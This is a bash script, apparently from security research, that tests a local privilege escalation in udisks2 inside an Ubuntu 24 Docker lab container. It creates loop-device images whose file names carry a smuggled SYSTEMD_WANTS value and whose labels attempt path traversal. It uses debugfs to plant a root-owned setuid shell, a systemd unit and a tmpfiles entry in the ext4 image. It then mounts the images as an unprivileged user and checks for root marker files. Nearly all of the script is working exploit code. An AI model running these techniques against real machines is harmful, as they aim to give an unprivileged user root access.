#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/udisks-metadata-systemd.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s <<'EOS'
set -euo pipefail

name=udisks-metadata-systemd
tmp="/tmp/$name"
home="/home/selfauth/$name"
root_marker="/root/${name}-root"
run_marker="/run/${name}-root"
tmp_marker="/tmp/${name}-root"

cleanup_target() {
  set +e
  if [ -s "$tmp/loops" ]; then
    awk '{print $2}' "$tmp/loops" | xargs -r -n1 umount >/dev/null 2>&1
  fi
  if [ -s "$tmp/mounts" ]; then
    awk '{print $2}' "$tmp/mounts" | xargs -r -n1 umount >/dev/null 2>&1
  fi
  while read -r mp; do
    [ -n "$mp" ] && umount "$mp" >/dev/null 2>&1
  done <<EOF
$(findmnt -rn -o TARGET 2>/dev/null | grep -E '^/media/selfauth/(meta_|XFS|UDMETA|VFAT|udisks)')
EOF
  losetup -a | awk -F: '/udisks-metadata-systemd|SYSTEMD_WANTS=udisks-meta-pwn/ {print $1}' | xargs -r -n1 losetup -d >/dev/null 2>&1
  loginctl terminate-user selfauth >/dev/null 2>&1
  rm -f /home/selfauth/.bash_profile
  systemctl start getty@tty1.service >/dev/null 2>&1
  systemctl reset-failed udisks2.service systemd-udevd.service getty@tty1.service >/dev/null 2>&1
  rm -rf "$home" "$root_marker" "$run_marker" "$tmp_marker" "/tmp/${name}-nosuid-user"
}
trap cleanup_target EXIT

rm -rf "$tmp" "$home" "$root_marker" "$run_marker" "$tmp_marker"
mkdir -p "$tmp" "$home"
chmod 1777 "$tmp"

id selfauth >/dev/null 2>&1 || useradd -m -s /bin/bash selfauth
echo selfauth:selfauth | chpasswd
usermod -G selfauth selfauth
id attacker >/dev/null 2>&1 || useradd -m -s /bin/bash attacker
chown -R selfauth:selfauth "$home"

{
  echo "## target and default proof"
  sed -n '1,8p' /etc/os-release
  uname -a
  id attacker
  id selfauth
  dpkg-query -W -f='${binary:Package}\t${Version}\n' \
    udisks2 libudisks2-0 libblockdev-fs3 libblockdev-loop3 \
    systemd udev dbus polkitd util-linux e2fsprogs xfsprogs dosfstools 2>&1 | sort
  echo

  echo "## default service and bus reachability"
  systemctl is-enabled udisks2.service 2>&1 || true
  systemctl is-active udisks2.service 2>&1 || true
  systemctl cat udisks2.service 2>&1 | sed -n '1,80p'
  busctl --system list 2>/dev/null | grep -E 'UDisks|login1|systemd' || true
  echo

  echo "## active-user polkit actions"
  grep -n 'filesystem-mount\|filesystem-fstab\|loop-setup\|modify-device' \
    /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy | sed -n '1,120p'
  echo

  echo "## udev/systemd metadata consumers"
  nl -ba /usr/lib/udev/rules.d/60-persistent-storage.rules | sed -n '137,164p'
  nl -ba /usr/lib/udev/rules.d/80-udisks2.rules | sed -n '1,38p'
  nl -ba /usr/lib/udev/rules.d/99-systemd.rules | sed -n '50,86p'
  nl -ba /etc/udisks2/mount_options.conf.example | sed -n '33,80p'
  echo

  echo "## writable trust-root checks as attacker"
  for p in /etc/udisks2 /etc/udev/rules.d /usr/lib/udev/rules.d /usr/lib/systemd/system /etc/systemd/system /media /run/systemd /usr/local/sbin /usr/local/bin /tmp /var/tmp; do
    stat -c '%A %U:%G %n' "$p" 2>/dev/null || true
    runuser -u attacker -- test -w "$p" && echo "attacker_writable:$p" || echo "attacker_not_writable:$p"
  done
} >"$tmp/root-prep.out" 2>&1

cat >"$home/seed-root-payload.sh" <<'SH'
#!/bin/sh
id > /root/udisks-metadata-systemd-root
id > /run/udisks-metadata-systemd-root
id > /tmp/udisks-metadata-systemd-root
SH
chmod 0755 "$home/seed-root-payload.sh"

cat >"$home/udisks-meta-pwn.service" <<'UNIT'
[Unit]
Description=UDisks metadata propagation probe root marker
[Service]
Type=oneshot
ExecStart=/home/selfauth/udisks-metadata-systemd/seed-root-payload.sh
UNIT

cat >"$home/udisks-meta-tmpfiles.conf" <<'TMPF'
f /root/udisks-metadata-systemd-root 0644 root root - tmpfiles-loaded-mounted-media
TMPF

cat >"$home/probe.sh" <<'SH'
#!/bin/bash
set +e
name=udisks-metadata-systemd
home="/home/selfauth/$name"
out="/tmp/$name/user.out"
exec >"$out" 2>&1

echo "## active session"
id
tty
echo "XDG_SESSION_ID=${XDG_SESSION_ID:-}"
if [ -n "${XDG_SESSION_ID:-}" ]; then
  loginctl show-session "$XDG_SESSION_ID" -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote
fi
echo

make_ext4() {
  local img="$home/ext4-SYSTEMD_WANTS=udisks-meta-pwn.service.img"
  truncate -s 96M "$img"
  mkfs.ext4 -q -U 11111111-2222-4333-8444-555555555555 -L 'meta/../x.mount' "$img"
  debugfs -w "$img" >/tmp/$name/debugfs-ext4.out 2>&1 <<EOF
mkdir etc
mkdir etc/systemd
mkdir etc/systemd/system
mkdir usr
mkdir usr/lib
mkdir usr/lib/tmpfiles.d
write $home/udisks-meta-pwn.service etc/systemd/system/udisks-meta-pwn.service
write $home/udisks-meta-tmpfiles.conf usr/lib/tmpfiles.d/udisks-meta-pwn.conf
write /bin/dash suidsh
set_inode_field suidsh mode 0104755
set_inode_field suidsh uid 0
set_inode_field suidsh gid 0
EOF
  echo "$img"
}

make_vfat() {
  local img="$home/vfat-SYSTEMD_WANTS=udisks-meta-pwn.service.img"
  truncate -s 64M "$img"
  mkfs.vfat -i DEADBEEF -n 'UDMETA PWN' "$img" >"/tmp/$name/mkfs-vfat.out" 2>&1
  echo "$img"
}

make_xfs() {
  local img="$home/xfs-SYSTEMD_WANTS=udisks-meta-pwn.service.img"
  truncate -s 384M "$img"
  mkfs.xfs -q -f -m uuid=aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee -L 'XFS..mount' "$img"
  echo "$img"
}

setup_loop() {
  local img="$1"
  local tag="$2"
  echo "## loop setup $tag"
  local setup dev
  setup="$(udisksctl loop-setup -f "$img" --no-user-interaction 2>&1)"
  echo "$setup"
  dev="$(printf '%s\n' "$setup" | sed -n 's/.* as \(\/dev\/loop[0-9]\+\).*/\1/p' | tail -1)"
  if [ -n "$dev" ]; then
    echo "$tag $dev $img" >>"/tmp/$name/loops"
    udevadm settle --timeout=15 2>&1 || true
    echo "dev=$dev"
    udevadm info --query=property --name "$dev" 2>&1 | grep -E '^(DEVLINKS|ID_FS|ID_LOOP|SYSTEMD|UDISKS)' | sort || true
    ls -l /dev/disk/by-label /dev/disk/by-uuid /dev/disk/by-loop-ref 2>&1 | sed -n '1,160p'
  fi
  echo
}

mount_loop() {
  local tag="$1"
  local dev="$2"
  echo "## mount option probes $tag $dev"
  udisksctl mount -b "$dev" -o suid --no-user-interaction 2>&1 || true
  udisksctl mount -b "$dev" -o dev --no-user-interaction 2>&1 || true
  if [ "$tag" = vfat ]; then
    udisksctl mount -b "$dev" -o uid=0,gid=0,umask=000 --no-user-interaction 2>&1 || true
  fi
  echo

  echo "## default mount $tag $dev"
  local mout mp unit
  mout="$(udisksctl mount -b "$dev" --no-user-interaction 2>&1)"
  echo "$mout"
  mp="$(printf '%s\n' "$mout" | sed -n 's/^Mounted .* at //p' | sed 's/\.$//' | tail -1)"
  if [ -n "$mp" ]; then
    echo "$tag $dev $mp" >>"/tmp/$name/mounts"
    echo "mountpoint=$mp"
    findmnt -no TARGET,SOURCE,FSTYPE,OPTIONS "$mp" 2>&1 || true
    stat -c '%A %U:%G %n' /media /media/selfauth "$mp" 2>&1 || true
    command -v getfacl >/dev/null 2>&1 && getfacl -p /media/selfauth "$mp" 2>&1 | sed -n '1,80p'
    unit="$(systemd-escape --path --suffix=mount "$mp" 2>/dev/null)"
    echo "systemd_escape_mount_unit=$unit"
    systemctl show "$unit" -p Id -p LoadState -p ActiveState -p FragmentPath -p SourcePath -p Where -p What 2>&1 || true
    if [ "$tag" = ext4 ]; then
      echo "## ext4 mounted metadata and nosuid execution"
      find "$mp" -maxdepth 4 -printf '%M %u:%g %p -> %l\n' 2>&1 | sort | sed -n '1,160p'
      "$mp/suidsh" -p -c 'id; touch /root/udisks-metadata-systemd-root 2>&1; touch /run/udisks-metadata-systemd-root 2>&1; touch /tmp/udisks-metadata-systemd-nosuid-user 2>&1' 2>&1 || true
      systemctl cat udisks-meta-pwn.service 2>&1 || true
    fi
  fi
  echo
}

echo "## image creation"
ext4_img="$(make_ext4)"
vfat_img="$(make_vfat)"
xfs_img="$(make_xfs)"
ls -l "$home" | sed -n '1,120p'
cat /tmp/$name/debugfs-ext4.out 2>&1 || true
cat /tmp/$name/mkfs-vfat.out 2>&1 || true
echo

setup_loop "$ext4_img" ext4
setup_loop "$vfat_img" vfat
setup_loop "$xfs_img" xfs

while read -r tag dev img; do
  [ -n "${tag:-}" ] && mount_loop "$tag" "$dev"
done <"/tmp/$name/loops"

echo "## user-side root marker check"
ls -l /root/udisks-metadata-systemd-root /run/udisks-metadata-systemd-root /tmp/udisks-metadata-systemd-root 2>&1 || true
SH

chmod 0755 "$home/probe.sh" "$home/seed-root-payload.sh"
chown -R selfauth:selfauth "$home"

cat >/home/selfauth/.bash_profile <<'SH'
/home/selfauth/udisks-metadata-systemd/probe.sh
exit
SH
chown selfauth:selfauth /home/selfauth/.bash_profile

systemctl stop getty@tty1.service >/dev/null 2>&1 || true
timeout 140 openvt -c 1 -s -f -w -- /bin/login -f selfauth || true
systemctl start getty@tty1.service >/dev/null 2>&1 || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true
rm -f /home/selfauth/.bash_profile
udevadm settle --timeout=25 >/dev/null 2>&1 || true

{
  cat "$tmp/root-prep.out"
  echo
  cat "$tmp/user.out" 2>&1 || true
  echo

  echo "## root-side udev/systemd state after active UDisks operations"
  if [ -s "$tmp/loops" ]; then
    while read -r tag dev img; do
      echo "# $tag $dev $img"
      udevadm info --query=property --name "$dev" 2>&1 | grep -E '^(DEVLINKS|ID_FS|ID_LOOP|SYSTEMD|UDISKS)' | sort || true
      unit="$(systemd-escape --path --suffix=device "$dev" 2>/dev/null || true)"
      echo "systemd_escape_device_unit=$unit"
      [ -n "$unit" ] && systemctl show "$unit" -p Id -p LoadState -p ActiveState -p FragmentPath -p SysFSPath 2>&1 || true
    done <"$tmp/loops"
  fi
  echo

  echo "## root-side mounted media and generated mount units"
  findmnt -rn -o TARGET,SOURCE,FSTYPE,OPTIONS | grep -F '/media/selfauth/' || true
  if [ -s "$tmp/mounts" ]; then
    while read -r tag dev mp; do
      echo "# $tag $dev $mp"
      stat -c '%A %U:%G %n' /media /media/selfauth "$mp" 2>&1 || true
      command -v getfacl >/dev/null 2>&1 && getfacl -p /media/selfauth "$mp" 2>&1 | sed -n '1,80p'
      unit="$(systemd-escape --path --suffix=mount "$mp" 2>/dev/null || true)"
      echo "mount_unit=$unit"
      [ -n "$unit" ] && systemctl show "$unit" -p Id -p LoadState -p ActiveState -p FragmentPath -p SourcePath -p Where -p What 2>&1 || true
    done <"$tmp/mounts"
  fi
  systemctl list-units --type=mount,device --all --no-pager | grep -E 'media-selfauth|udisks-meta|loop' || true
  echo

  echo "## systemd/tmpfiles/log consumers"
  systemctl daemon-reload 2>&1 || true
  systemctl cat udisks-meta-pwn.service 2>&1 || true
  systemd-tmpfiles --cat-config 2>&1 | grep -E '/media|udisks-meta|by-label|by-uuid|by-loop-ref' || true
  journalctl -b -u systemd-udevd.service -u udisks2.service --no-pager 2>&1 | grep -E 'udisks-metadata-systemd|SYSTEMD_WANTS=udisks-meta|meta\\x2f|UDMETA|XFS\\.\\.mount' | tail -80 || true
  echo

  echo "## root proof"
  ls -l "$root_marker" "$run_marker" "$tmp_marker" 2>&1 || true
  for p in "$root_marker" "$run_marker" "$tmp_marker"; do
    [ -e "$p" ] && { echo "marker_contents:$p"; cat "$p"; } || true
  done
  echo

  echo "## cleanup"
  cleanup_target
  losetup -a | grep -E 'udisks-metadata-systemd|SYSTEMD_WANTS=udisks-meta-pwn' || true
  findmnt -rn -o TARGET | grep -F '/media/selfauth/' | grep -F "$name" || true
  ls -l "$root_marker" "$run_marker" "$tmp_marker" 2>&1 || true
  systemctl is-system-running || true
  systemctl --failed --no-legend || true
} >"$tmp/root.out" 2>&1
EOS

docker exec "$container" cat /tmp/udisks-metadata-systemd/root.out > "$log"
docker exec "$container" rm -rf /tmp/udisks-metadata-systemd
sed -n '1,420p' "$log"
